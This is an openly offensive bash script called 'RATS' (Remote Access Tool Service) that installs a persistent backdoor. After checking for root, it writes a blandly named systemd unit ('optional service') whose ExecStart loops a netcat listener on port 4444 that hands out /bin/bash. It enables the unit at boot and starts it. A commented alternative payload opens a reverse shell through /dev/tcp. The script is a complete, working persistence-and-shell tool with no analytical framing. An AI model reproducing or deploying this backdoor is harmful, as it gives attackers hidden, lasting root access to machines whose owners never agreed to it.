#!/bin/bash

################################################################################################################
# Remote Access Tool Service                                                                                   #
# Make a persistent service with a custom script by using systemd on the fly                                   #
#                                                                                                              #
# The goal of RATS, in this case, is leave a nc connection always listening as a permanent systemd service.    #
# The resultant is a root shell                                                                                #
#                                                                                                              #
#                                                                                     by 0bfxgh0st*            #
################################################################################################################

if [[ $(id -u) != 0 ]]
then
       printf "%s\n" "Run sudo bash RAT-service.sh"
       printf "%s\n" "you will gain root privilege access"
       exit
fi


if [[ $(sudo -l | grep -o '(ALL : ALL) ALL') == '(ALL : ALL) ALL' ]];
then
        printf "[\e[0;32m+\e[0m] sudo abuse 100%%\n"
        printf "[\e[0;32m+\e[0m] \e[1mRoot access granted for service\e[0m\n"
else
        printf "\n[\e[0;31m-\e[0m] Root access cannot be guaranteed\n"
fi


function header(){
cat << "EOF"
                _                       __
              /   \                  /      \
             '      \              /          \
            |       |Oo          o|            |
            `    \  |OOOo......oOO|   /        |
             `    \\OOOOOOOOOOOOOOO\//        /
               \ _o\OOOOOOOOOOOOOOOO//. ___ /
           ______OOOOOOOOOOOOOOOOOOOOOOOo.___
            --- OO'* `OOOOOOOOOO'*  `OOOOO--
                OO.   OOOOOOOOO'    .OOOOO o
                `OOOooOOOOOOOOOooooOOOOOO'OOOo
              .OO "OOOOOOOOOOOOOOOOOOOO"OOOOOOOo
          __ OOOOOO`OOOOOOOOOOOOOOOO"OOOOOOOOOOOOo
         ___OOOOOOOO_"OOOOOOOOOOO"_OOOOOOOOOOOOOOOO
           OOOOO^OOOO0`(____)/"OOOOOOOOOOOOO^OOOOOO
           OOOOO OO000/000000\000000OOOOOOOO OOOOOO
           OOOOO O0000000000000000 ppppoooooOOOOOO
           `OOOOO 0000000000000000 QQQQ "OOOOOOO"
            o"OOOO 000000000000000oooooOOoooooooO'
            OOo"OOOO.00000000000000000000OOOOOOOO'
           OOOOOO QQQQ 0000000000000000000OOOOOOO
          OOOOOO00eeee00000000000000000000OOOOOOOO.
         OOOOOOOO000000000000000000000000OOOOOOOOOO
         OOOOOOOOO00000000000000000000000OOOOOOOOOO
         `OOOOOOOOO000000000000000000000OOOOOOOOOOO
           "OOOOOOOO0000000000000000000OOOOOOOOOOO'
             "OOOOOOO00000000000000000OOOOOOOOOO"
  .ooooOOOOOOOo"OOOOOOO000000000000OOOOOOOOOOO"
.OOO"""""""""".oOOOOOOOOOOOOOOOOOOOOOOOOOOOOo
OOO         QQQQO"'                     `"QQQQ
OOO
`OOo.
  `"OOOOOOOOOOOOoooooooo.

EOF
}

printf "\n\e[1mR.A.T.S\e[0m\n"
printf "%s\n" "Remote Access Tool Service"
printf "%s\n" "Install systemd service and gain root access"
header
rat_service_name="optional"

#### PAYLOADS ####
# Netcat    connect to by nc 127.0.0.1 4444 #####################################
payload='/bin/bash -c "while [ 0 -eq 0 ]; do nc -lvp 4444 -e /bin/bash;done"'
#################################################################################
# Bash      connect to by nc -lvp 4444 ######################################################
#payload='/bin/bash -c "while [ 0 -eq 0 ]; do bash -i >& /dev/tcp/127.0.0.1/4444 0>&1;done"'
#############################################################################################

function permanent_service(){
cat << EOF
[Unit]
Description=optional service
[Service]
Type=oneshot
ExecStart=$payload
[Install]
WantedBy=multi-user.target
EOF
}

printf -- "[\e[0;32m+\e[0m] Creating service called $rat_service_name.service\n"
permanent_service > /etc/systemd/system/$rat_service_name.service
printf -- "[\e[0;32m+\e[0m] Enabling service and making persistent on boot\n"
systemctl daemon-reload
systemctl enable $rat_service_name.service
printf -- "[\e[0;32m+\e[0m] Done\n"
systemctl start $rat_service_name.service 2>/dev/null &
